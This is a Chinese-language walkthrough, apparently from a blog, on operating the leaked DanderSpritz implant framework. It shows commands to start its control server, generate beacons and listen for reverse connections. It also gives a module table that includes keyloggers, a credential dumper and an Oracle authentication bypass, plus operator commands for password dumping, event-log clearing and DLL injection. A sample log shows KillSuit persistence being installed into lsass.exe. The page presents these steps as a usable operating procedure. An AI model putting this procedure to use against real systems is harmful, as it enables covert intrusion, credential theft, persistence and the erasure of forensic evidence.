### 检查和配置验证

**运行命令:**
```
python windows\checkpsp.py -project Ops
```

- **检查已知PSP的运行状态...**
  - 未发现目标历史记录。
  - 当前没有已知的PSP在运行。
- **检查配置变更...**
  - 命令执行成功。

**审计日志:**
- [2022-04-06 16:35:37 z0.0.0.12] 审计数据年龄：13秒（来自本地缓存，如需最新数据请手动重新运行）
- [2022-04-06 16:35:37 z0.0.0.12] 本机未启用审计功能
- [2022-04-06 16:35:37 z0.0.0.12] 审计功能已关闭，无需进一步操作

**监控信息:**
- 监控器列表

根据提示信息，`Dsz_Implant_Pc.dll`并未直接传输整个文件，而是发送了137,488字节的Payload。这可能是由于压缩或其他原因导致的。

### Beacon上线流程概述

上述过程展示了最基本的Beacon上线流程。值得注意的是，在Python脚本支持下实现的任务列表。

根据John Bergbom的分析，PeddleCheap使用RSA密钥协商机制，并在协商过程中传输公钥。

### 模块列表

在系统页面的“关于”部分，可以查看加载的模块列表。以下是一些主要模块及其版本：

| 短名 | 代码名 | 说明 |
| --- | --- | --- |
| DSky | Darkskyline | 抓包工具 |
| DaPu | DarkPulsar | PeddleCheap的前身 |
| DeMI | DecibelMinute | KillSuit管理器 |
| Df | DoubleFeature | 报表生成器 |
| DmGZ | DoormanGauze | 内核网络驱动，绕过系统TCP堆栈 |
| Dsz | DanderSpritz | DanderSpritz的相关文件 |
| Ep | ExpandingPulley | DanderSpritz的前身 |
| FlAv | FlewAvenue | DoormanGauze相关 |
| GRDO | GreaterDoctor | GreaterSurgeon的数据分析 |
| GROK | ? | 键盘记录器 |
| GRcl | ? | 进程内存dump |
| GaTh | GangsterTheif | 持久化数据分析 |
| GeZU | GreaterSurgeon | 内存Dump |
| Pfree | Passfreely | Oracle认证绕过 |
| PaCU | PaperCut | 操作其他进程文件句柄 |
| Pc | PeddleCheap | 监听程序，与Beacon进行交互 |
| ScRe | ? | SQL查询 |
| StLa | Strangeland | 键盘记录器 |
| TeDi | TerritorialDispute | 检查是否可以持久化 |
| Utbu | UtilityBurst | 安装驱动模块 |
| ZBng | ZippyBang | NSA版本的Mimikatz |

### DanderSpritz GUI

在命令行界面中，需要Python 2.7才能正常工作。通过执行以下命令启动管理客户端和C2服务端：
```
python start_lp.py
java -jar start.jar
help
```

在GUI的Terminal界面内，可以通过执行`pc_prep`或`pc2.2_prep`来生成Beacon。然后启动PeddleCheap下的监听程序以接收Beacon的反向连接。

### 可用命令

在Terminals终端内，可以使用的命令包括但不限于：
- `activedirectory`
- `activity`
- `addresses`
- `aliases`
- `appcompat`
- `arp`
- `audit`
- `authentication`
- `available`
- `banner`
- `break`
- `cd`
- `commands`
- `copy`
- `cprpc`
- `currentusers`
- `database`
- `delete`
- `devicequery`
- `dir`
- `diskspace`
- `dllload`
- `dmgz_control`
- `dns`
- `domaincontroller`
- `drivers`
- `drives`
- `duplicatetoken`
- `environment`
- `eventlogclear`
- `eventlogedit`
- `eventlogfilter`
- `eventlogquery`
- `fileattributes`
- `filetype`
- `firewall`
- `flav_control`
- `freeplugin`
- `frzaddress`
- `frzlinks`
- `frzroutes`
- `frzsecassocs`
- `frztimeouts`
- `gangsterthief`
- `generatedata`
- `get`
- `getadmin`
- `gezu_kernelmemory`
- `grdo_filescanner`
- `grdo_processscanner`
- `grep`
- `groups`
- `gui`
- `handles`
- `help`
- `hide`
- `ifconfig`
- `injectdll`
- `keepalive`
- `kill`
- `kisu_addmodule`
- `kisu_config`
- `kisu_connect`
- `kisu_deletemodule`
- `kisu_disconnect`
- `kisu_freedriver`
- `kisu_freemodule`
- `kisu_fulllist`
- `kisu_install`
- `kisu_list`
- `kisu_loaddriver`
- `kisu_loadmodule`
- `kisu_processload`
- `kisu_readmodule`
- `kisu_survey`
- `kisu_uninstall`
- `kisu_upgrade`
- `language`
- `ldap`
- `library`
- `loadplugin`
- `logedit`
- `logonasuser`
- `lpdirectory`
- `lpgetenv`
- `lpsetenv`
- `matchfiletimes`
- `memory`
- `mkdir`
- `moduletoggle`
- `move`
- `nameserverlookup`
- `netbios`
- `netconnections`
- `netmap`
- `objects`
- `oracle`
- `packages`
- `packetredirect`
- `papercut`
- `passworddump`
- `pc_connect`
- `pc_listen`
- `pc_status`
- `performance`
- `permissions`
- `ping`
- `plugins`
- `policy`
- `portmap`
- `processes`
- `processinfo`
- `processmemory`
- `processmodify`
- `processoptions`
- `processsuspend`
- `put`
- `pwd`
- `quitanddelete`
- `redirect`
- `registryadd`
- `registrydelete`
- `registryhive`
- `registryquery`
- `remoteexecute`
- `rmdir`
- `route`
- `run`
- `runaschild`
- `scheduler`
- `script`
- `serialredirect`
- `services`
- `shares`
- `shutdown`
- `sidlookup`
- `sql`
- `stop`
- `strings`
- `systempaths`
- `systemversion`
- `throttle`
- `time`
- `traceroute`
- `trafficcapture`
- `uptime`
- `users`
- `version`
- `warn`
- `whoami`
- `windows`
- `wrappers`
- `xmlparser`

### KillSuit (GreyFish)

KillSuit是用于后渗透操作的模块。它支持多种方式的系统渗透、持久化和数据窃取。具体命令如下：
- `kisu_addmodule`
- `kisu_config`
- `kisu_connect`
- `kisu_deletemodule`
- `kisu_disconnect`
- `kisu_freedriver`
- `kisu_freemodule`
- `kisu_fulllist`
- `kisu_install`
- `kisu_list`
- `kisu_loaddriver`
- `kisu_loadmodule`
- `kisu_processload`
- `kisu_readmodule`
- `kisu_survey`
- `kisu_uninstall`
- `kisu_upgrade`

### 示例操作

- **安装PC到目标系统:**
  ```
  00:47:13>> pc_install
  [00:47:13] ID: 762 'script' started [target: z0.0.0.14]
  - Current Configuration:
  - Load Method : AppCompat
  - Process Name : lsass.exe
  - COMMS Type : Winsock
  - Trigger Name : ntfltmgr
  - Payload : None
  - KiSu Connection : Not connected
  ```

- **验证持久化:**
  - 重启目标机并使用PC连接目标机。选择Level4的第一个1167。

- **KiSu模块操作:**
  - `kisu_survey`
  - `kisu_install -type pc`
  - `kisu_connect -type pc`
  - `kisu_list`

以上步骤将帮助你完成基本的Beacon上线流程及后续操作。